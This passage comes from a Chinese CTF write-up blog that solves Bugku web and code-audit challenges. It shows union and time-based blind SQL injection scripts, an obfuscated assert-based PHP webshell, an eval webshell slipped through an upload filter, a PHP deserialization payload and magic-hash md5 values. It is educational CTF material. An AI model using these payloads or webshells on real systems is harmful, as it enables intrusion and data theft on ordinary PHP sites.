class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先是正则表达式判断，过滤了括号和引号等字符,<strong>无法使用</strong>文件包含漏洞；伪协议读取，eval代码执行漏洞等等方式来读取flag中的文件…</p><p>注意代码最后一行中<code>$$args</code> 这个地方。PHP 在名为 <code>$GLOBALS[index]</code> 的数组中存储了所有全局变量。变量的名字就是数组的键。构造PHP中超全局变量 $GLOBALS  </p><p>var_dump()函数将$GLOBALS数组中存放的所有变量以数组的方式输出 得到flag！</p><p><br><br><br></p><h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>一开始看源码看了半天，没发现什么东西。Burp suite 抓包查看，也没发现什么东西…</p><p>御剑扫描网站根目录，发现一个 shell.php 的文件</p><p>URL访问，发现是个登录页面，进行弱密码爆破，得到flag…</p><p><br><br><br></p><h2 id="成绩查询"><a href="#成绩查询" class="headerlink" title="成绩查询"></a>成绩查询</h2><p>一道很简单的sql题，但是盲注流程很完善；记录一下</p><p>首先登录页面，一看查询框就知道是sql题，看一下网页源码里面有没有提示的语句，发现没有，那么是一道盲注题</p><p>构造 <code>1&#39; and 1=1 #</code> 发现可以执行查询，但是构造 <code>1&#39; and 1=2 #</code> 不会执行查询，找到可注入点</p><p>判断字段，先目测一波至少字段为4，直接构造 <code>1&#39; order by 5 #</code>,发现不会执行查询，构造 <code>1&#39; order by 4 #</code> 执行了查询，说明字段数为4</p><p>通过union联合注入先注出数据库 <code>-1&#39; union select 1,database(),3,4; #</code> 结果为 <strong>skctf_flag</strong></p><p>查询表名 <code>-1&#39; union select 1,table_name,3,4 from information_schema.tables where table_schema=&#39;skctf_flag&#39; #</code> 结果为 <strong>fl4g</strong></p><p>查询列名 <code>-1&#39; union select 1,column_name,3,4 from information_schema.columns where table_name=&#39;fl4g&#39; #</code> 结果为 <strong>skctf_flag</strong></p><p>最后查询 <code>-1&#39; union select 1,skctf_flag,3,4 from fl4g #</code> 结果就得到了flag…</p><p><strong>注意：</strong>一个空位只能添加一个查询，默认查询表中第一个记录，也就是说数据库可能不止一个，刚刚的那个库只是表中的第一个库，所以最好使用 <code>group_concat()</code>函数进行查询</p><p><br><br><br></p><h2 id="脚本题"><a href="#脚本题" class="headerlink" title="脚本题"></a>脚本题</h2><h3 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h3><p><a href="https://ciphersaw.me/2017/12/16/%E8%AF%A6%E8%A7%A3%20CTF%20Web%20%E4%B8%AD%E7%9A%84%E5%BF%AB%E9%80%9F%E5%8F%8D%E5%BC%B9%20POST%20%E8%AF%B7%E6%B1%82/" target="_blank" rel="noopener">【转载】详解 CTF Web 中的快速反弹 POST 请求</a></p><p>脚本题，贴脚本</p><p><br><br><br></p><h2 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h2><p>刚拿到题，直接说input a，有点迷茫，看源码也没东西，抓包看头也没藏东西。只能百度一手，发现是md5碰撞</p><p>题目是md5 collision,md5碰撞。所以找一个md5是oe开头的值，get方式传参过去</p><p>PAYLOAD <code>120.24.86.145:9009/md5.php?a=s878926199a</code></p><ul><li><strong>常用的md5</strong></li></ul><table><thead><tr><th align="center">表达式</th><th align="center">值</th></tr></thead><tbody><tr><td align="center">QNKCDZO</td><td align="center">0e830400451993494058024219903391</td></tr><tr><td align="center">s878926199a</td><td align="center">0e545993274517709034328855841020</td></tr><tr><td align="center">s155964671a</td><td align="center">0e342768416822451524974117254469</td></tr><tr><td align="center">s214587387a</td><td align="center">0e848240448830537924465865611904</td></tr><tr><td align="center">s214587387a</td><td align="center">0e848240448830537924465865611904</td></tr><tr><td align="center">s878926199a</td><td align="center">0e545993274517709034328855841020</td></tr><tr><td align="center">s1091221200a</td><td align="center">0e940624217856561557816327384675</td></tr><tr><td align="center">s1885207154a</td><td align="center">0e509367213418206700842008763514</td></tr><tr><td align="center">s1502113478a</td><td align="center">0e861580163291561247404381396064</td></tr><tr><td align="center">s1885207154a</td><td align="center">0e509367213418206700842008763514</td></tr><tr><td align="center">s1836677006a</td><td align="center">0e481036490867661113260034900752</td></tr><tr><td align="center">s155964671a</td><td align="center">0e342768416822451524974117254469</td></tr><tr><td align="center">s1184209335a</td><td align="center">0e072485820392773389523109082030</td></tr><tr><td align="center">s1665632922a</td><td align="center">0e731198061491163073197128363787</td></tr><tr><td align="center">s1502113478a</td><td align="center">0e861580163291561247404381396064</td></tr><tr><td align="center">s1836677006a</td><td align="center">0e481036490867661113260034900752</td></tr><tr><td align="center">s1091221200a</td><td align="center">0e940624217856561557816327384675</td></tr><tr><td align="center">s155964671a</td><td align="center">0e342768416822451524974117254469</td></tr><tr><td align="center">s1502113478a</td><td align="center">0e861580163291561247404381396064</td></tr><tr><td align="center">s155964671a</td><td align="center">0e342768416822451524974117254469</td></tr><tr><td align="center">s1665632922a</td><td align="center">0e731198061491163073197128363787</td></tr><tr><td align="center">s155964671a</td><td align="center">0e342768416822451524974117254469</td></tr><tr><td align="center">s1091221200a</td><td align="center">0e940624217856561557816327384675</td></tr><tr><td align="center">s1836677006a</td><td align="center">0e481036490867661113260034900752</td></tr><tr><td align="center">s1885207154a</td><td align="center">0e509367213418206700842008763514</td></tr><tr><td align="center">s532378020a</td><td align="center">0e220463095855511507588041205815</td></tr><tr><td align="center">s878926199a</td><td align="center">0e545993274517709034328855841020</td></tr><tr><td align="center">s1091221200a</td><td align="center">0e940624217856561557816327384675</td></tr><tr><td align="center">s214587387a</td><td align="center">0e848240448830537924465865611904</td></tr><tr><td align="center">s1502113478a</td><td align="center">0e861580163291561247404381396064</td></tr><tr><td align="center">s1091221200a</td><td align="center">0e940624217856561557816327384675</td></tr><tr><td align="center">s1665632922a</td><td align="center">0e731198061491163073197128363787</td></tr><tr><td align="center">s1885207154a</td><td align="center">0e509367213418206700842008763514</td></tr><tr><td align="center">s1836677006a</td><td align="center">0e481036490867661113260034900752</td></tr><tr><td align="center">s1665632922a</td><td align="center">0e731198061491163073197128363787</td></tr><tr><td align="center">s878926199a</td><td align="center">0e545993274517709034328855841020</td></tr></tbody></table><p><br><br><br></p><h2 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h2><p>打开网页一串乱码，源码跟请求头都没什么可以利用的信息</p><p>发现URL比较有趣<br><code>http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</code></p><p>filename参数后面跟了一个经过base64编码的东西，解码为 keys.txt</p><p>尝试构造 index.php 因为URL那里的源码肯定要经过一次base64解码读到，所以我们先将其进行编码再传入<br><code>http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw</code></p><p>没有任何回显，发现 line 参数后面的值为0，通过尝试发现可以解析一行的代码，写一个脚本跑出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">a = <span class="number">20</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(a):</span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web11/index.php?line="</span>+str(i)+<span class="string">"&amp;filename=aW5kZXgucGhw"</span></span><br><span class="line">s=requests.get(url)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure><p>跑出的源码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>给了一个文件是 keys.php ，只要cookie中 margin=margin，就ok了</p><p>hackbar操作一番，查看源码，获得flag…</p><p><br><br><br></p><h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>直接上代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$poc=<span class="string">"a#s#s#e#r#t"</span>; </span><br><span class="line">$poc_1=explode(<span class="string">"#"</span>,$poc); <span class="comment">//explode() 函数把字符串打散为数组。</span></span><br><span class="line">$poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; <span class="comment">//对其赋值，assert</span></span><br><span class="line">$poc_2($_GET[<span class="string">'s'</span>])<span class="comment">//GET进行传参</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用assert()函数的解析传进来的s串，assert有代码执行漏洞。</p><p>payload<br><code>?s=print_r(scandir(&#39;./&#39;))    //扫描当前目录，并按数组输出。</code> </p><p><br><br><br></p><h2 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h2><p>F12得到一段被注释掉的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>GET传入3个参数，检查了 $user 是否被设置，file_get_contents（）读取其内容，include包含了一个文件</p><p>考察PHP伪协议</p><p>利用php://input 绕过 file_get_contents（），include包含的文件，用伪协议进行读取</p><p>通过读取 hint.php 和 index.php 的源码发现可以利用反序列化，通过构造 password 的序列化来读取</p><ul><li>hint.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hint.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  <span class="comment">//这是个重点</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>index.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; <span class="comment">//正则匹配，不能出现flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  <span class="comment">//这里出现了反序列化</span></span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>通读代码发现构造 password 的反序列化可以实现读取flag，猜测flag文件是 flag.php </p><p>写个脚本构造一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line">$a = <span class="keyword">new</span> Flag();</span><br><span class="line">$a-&gt;file = <span class="string">'flag.php'</span>;</span><br><span class="line">print_r(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="http://123.206.87.240:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}" target="_blank" rel="noopener">http://123.206.87.240:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</a></p><p>拿到Flag…</p><p><br><br><br></p><h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);<span class="comment">//关闭错误报告</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;<span class="comment">//自定义函数</span></span><br><span class="line">$ip = <span class="string">''</span>;<span class="comment">//设置ip为空</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;<span class="comment">//检验是否设置XFF头</span></span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];<span class="comment">//对其ip进行赋值</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];<span class="comment">//对ip的其他赋值</span></span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);<span class="comment">//切割ip，explode() 函数把字符串打散为数组</span></span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];<span class="comment">//返回第一个</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;<span class="comment">//设置host</span></span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();<span class="comment">//执行函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没有在源码之中找到SQL语句，只检测了XFF头之类的…网上找一波资料</p><p>可以看到，这是X-Forwarded-For的注入，而且过滤了逗号,。在过滤了逗号的情况下，我们就不能使用if语句了，在mysql中与if有相同功效的就是：</p><p><code>select case when (条件) then 代码1 else 代码 2 end;</code></p><p>而且由于逗号,被过滤，我们就不能使用substr、substring了，但我们可以使用：from 1 for 1，所以最终我们的payload如下：<br><code>127.0.0.1&#39;+(select case when substr((select flag from flag) from 1 for 1)=&#39;a&#39; then sleep(5) else 0 end))-- +</code></p><p>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># 基于时间的盲注，过滤了逗号 ,</span></span><br><span class="line">sql = <span class="string">"127.0.0.1'+(select case when substr((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;' then sleep(5) else 0 end))-- +"</span></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    print(<span class="string">'正在猜测：'</span>, str(i))</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">129</span>):</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">128</span>:</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        sqli = sql.format(i, chr(ch))</span><br><span class="line">        <span class="comment"># print(sqli)</span></span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">'X-Forwarded-For'</span>: sqli</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            html = requests.get(url, headers=header, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += chr(ch)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><br><br><br></p><h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p>这题过滤了一些东西，同时提醒了我上传一句话木马的目的到底是为了什么，只是单纯用菜刀连接还是有其他的办法达到你想要的目的</p><p>F12得到 upload.php 然后直接访问地址</p><p>看到一个文件上传的点</p><p>上传普通的一句话会被过滤，且白名单限制，只能上传图片格式。</p><p>普通的图片马会被过滤掉，菜刀连不上<br>采用<code>&lt;script language=php&gt;echo &#39;a&#39;; eval($_POST[&#39;pass&#39;]);&lt;/script&gt;</code></p><p><code>&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;</code> 得到flag</p><p><br><br><br></p><p>## </p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><p>##</p><p><br><br><br></p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><p>分析源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);<span class="comment">//关闭错误报告</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($temp)</span>//自定义函数</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line">$one = ord(<span class="string">'1'</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$nine = ord(<span class="string">'9'</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$number = <span class="string">'3735929054'</span>;<span class="comment">//对其赋值</span></span><br><span class="line"><span class="comment">// Check all the input characters!</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)<span class="comment">//循环开始，循环次数为number的长度的次数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Disallow all the digits!</span></span><br><span class="line">$digit = ord($temp&#123;$i&#125;);<span class="comment">//返回变量temp中的一个字符，赋值给$dight</span></span><br><span class="line"><span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )<span class="comment">//变量$temp不能存在1~9之间的数字</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Aha, digit not allowed!</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"flase"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($number == $temp)<span class="comment">//判断使其相等</span></span><br><span class="line"><span class="keyword">return</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[<span class="string">'password'</span>];<span class="comment">//在这里GET传参赋值给 $temp</span></span><br><span class="line"><span class="keyword">echo</span> noother_says_correct($temp);<span class="comment">//执行自定义函数，并且echo输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个题判断了输入的 password，然后赋值给$temp ，每一位不能大于一小于9，但是要和 3735929054 相等</p><p>bypass： php在转码时会把16进制转化为十进制</p><p><br><br><br></p><h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p>分析源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"xxx"</span>;<span class="comment">//没什么用的一行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>]))<span 